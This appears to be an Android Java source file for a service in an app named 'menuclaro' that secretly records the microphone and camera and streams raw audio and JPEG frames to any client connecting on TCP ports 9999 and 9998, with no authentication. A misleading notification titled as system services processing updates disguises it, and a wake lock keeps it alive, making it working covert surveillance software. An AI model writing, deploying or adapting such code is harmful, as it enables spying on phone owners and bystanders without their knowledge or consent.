package com.menuclaro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.view.Surface;
import androidx.core.app.NotificationCompat;

import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class StreamService extends Service {

    public static boolean isRunning = false;

    private static final String CHANNEL_ID = "MenuClaroService";
    private static final int PORT_AUDIO = 9999;
    private static final int PORT_VIDEO  = 9998;
    private static final int SAMPLE_RATE = 44100;
    private static final int WIDTH  = 640;
    private static final int HEIGHT = 480;

    private PowerManager.WakeLock wakeLock;
    private AudioRecord audioRecord;
    private Thread audioThread;
    private Thread videoThread;
    private volatile boolean streaming = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopSelf();
            return START_NOT_STICKY;
        }
        startForegroundNotification();
        acquireWakeLock();
        streaming = true;
        isRunning = true;
        startAudioServer();
        startVideoServer();
        return START_STICKY;
    }

    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Servicios del sistema", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        startForeground(1, new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Servicios activos")
                .setContentText("Procesando actualizaciones del sistema...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true).build());
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MenuClaro::StreamWakeLock");
        wakeLock.acquire();
    }

    // ─── AUDIO ───────────────────────────────────────────
    private void startAudioServer() {
        audioThread = new Thread(() -> {
            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                try {
                    serverSocket = new ServerSocket(PORT_AUDIO);
                    serverSocket.setReuseAddress(true);
                    client = serverSocket.accept();
                    client.setTcpNoDelay(true);

                    int buf = AudioRecord.getMinBufferSize(SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                    audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, buf * 4);
                    audioRecord.startRecording();

                    OutputStream out = client.getOutputStream();
                    byte[] buffer = new byte[2048];
                    while (streaming && !client.isClosed()) {
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) { out.write(buffer, 0, read); out.flush(); }
                    }
                } catch (Exception e) {
                } finally {
                    try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); audioRecord = null; } } catch (Exception ignored) {}
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(300); } catch (InterruptedException ie) { break; }
                }
            }
        });
        audioThread.setDaemon(true);
        audioThread.start();
    }

    // ─── VIDEO - Fresh camera session per client ──────────
    private void startVideoServer() {
        videoThread = new Thread(() -> {
            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                HandlerThread bgThread = null;
                Handler bgHandler = null;
                CameraDevice cameraDevice = null;
                CameraCaptureSession[] captureSessionHolder = new CameraCaptureSession[1];
                ImageReader imageReader = null;

                try {
                    serverSocket = new ServerSocket(PORT_VIDEO);
                    serverSocket.setReuseAddress(true);
                    client = serverSocket.accept();
                    client.setTcpNoDelay(true);

                    final Socket finalClient = client;
                    final OutputStream[] outHolder = {client.getOutputStream()};

                    // Fresh background thread for this session
                    bgThread = new HandlerThread("CamBg");
                    bgThread.start();
                    bgHandler = new Handler(bgThread.getLooper());

                    // Fresh ImageReader for this session
                    imageReader = ImageReader.newInstance(WIDTH, HEIGHT, ImageFormat.JPEG, 2);
                    final ImageReader finalReader = imageReader;

                    imageReader.setOnImageAvailableListener(reader -> {
                        android.media.Image image = reader.acquireLatestImage();
                        if (image == null) return;
                        try {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            // Send frame
                            OutputStream out = outHolder[0];
                            if (out == null) return;
                            int len = bytes.length;
                            byte[] header = new byte[]{(byte)(len>>24),(byte)(len>>16),(byte)(len>>8),(byte)len};
                            out.write(header);
                            out.write(bytes);
                            out.flush();
                        } catch (Exception e) {
                            outHolder[0] = null; // mark as disconnected
                        } finally { image.close(); }
                    }, bgHandler);

                    // Open camera
                    CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
                    String[] cameraIds = manager.getCameraIdList();
                    final Handler finalBgHandler = bgHandler;
                    final ImageReader finalIR = imageReader;
                    final CameraDevice[] camHolder = {null};
                    final Object cameraLock = new Object();

                    manager.openCamera(cameraIds[0], new CameraDevice.StateCallback() {
                        @Override public void onOpened(CameraDevice camera) {
                            camHolder[0] = camera;
                            try {
                                SurfaceTexture texture = new SurfaceTexture(0);
                                texture.setDefaultBufferSize(WIDTH, HEIGHT);
                                Surface dummy  = new Surface(texture);
                                Surface readerSurface = finalIR.getSurface();
                                CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                builder.addTarget(readerSurface);
                                camera.createCaptureSession(Arrays.asList(dummy, readerSurface),
                                        new CameraCaptureSession.StateCallback() {
                                            @Override public void onConfigured(CameraCaptureSession session) {
                                                captureSessionHolder[0] = session;
                                                try {
                                                    builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                                                    session.setRepeatingRequest(builder.build(), null, finalBgHandler);
                                                    synchronized (cameraLock) { cameraLock.notifyAll(); }
                                                } catch (Exception e) { e.printStackTrace(); }
                                            }
                                            @Override public void onConfigureFailed(CameraCaptureSession session) {
                                                synchronized (cameraLock) { cameraLock.notifyAll(); }
                                            }
                                        }, finalBgHandler);
                            } catch (Exception e) {
                                e.printStackTrace();
                                synchronized (cameraLock) { cameraLock.notifyAll(); }
                            }
                        }
                        @Override public void onDisconnected(CameraDevice camera) {
                            camera.close();
                            synchronized (cameraLock) { cameraLock.notifyAll(); }
                        }
                        @Override public void onError(CameraDevice camera, int error) {
                            camera.close();
                            synchronized (cameraLock) { cameraLock.notifyAll(); }
                        }
                    }, bgHandler);

                    // Wait for camera to open
                    synchronized (cameraLock) { cameraLock.wait(3000); }
                    cameraDevice = camHolder[0];

                    // Stream until client disconnects
                    while (streaming && !finalClient.isClosed() && outHolder[0] != null) {
                        Thread.sleep(200);
                    }

                } catch (Exception e) {
                    // disconnected
                } finally {
                    // Clean up everything for this session
                    try { if (captureSessionHolder[0] != null) captureSessionHolder[0].close(); } catch (Exception ignored) {}
                    try { if (cameraDevice != null) cameraDevice.close(); } catch (Exception ignored) {}
                    try { if (imageReader != null) imageReader.close(); } catch (Exception ignored) {}
                    try { if (bgThread != null) { bgThread.quitSafely(); bgThread.join(1000); } } catch (Exception ignored) {}
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(500); } catch (InterruptedException ie) { break; }
                }
            }
        });
        videoThread.setDaemon(true);
        videoThread.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        streaming = false;
        isRunning = false;
        try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); } } catch (Exception e) {}
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
